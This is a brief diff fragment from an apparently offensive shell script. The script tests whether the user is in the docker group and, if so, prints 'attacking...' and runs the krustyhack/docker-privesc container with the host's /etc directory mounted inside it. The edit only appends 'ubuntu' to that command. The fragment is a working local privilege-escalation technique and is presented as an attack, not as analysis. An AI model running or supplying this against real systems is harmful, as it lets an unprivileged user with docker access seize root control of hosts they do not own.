@@ -7,7 +7,7 @@ fi
 
 if groups $USER |grep -q docker; then
     echo "User $USER in docker group, attacking..."
-    docker run -it -v /etc:/root krustyhack/docker-privesc
+    docker run -it -v /etc:/root krustyhack/docker-privesc ubuntu
 else
     echo "User $USER not in docker group, abort."
 fi
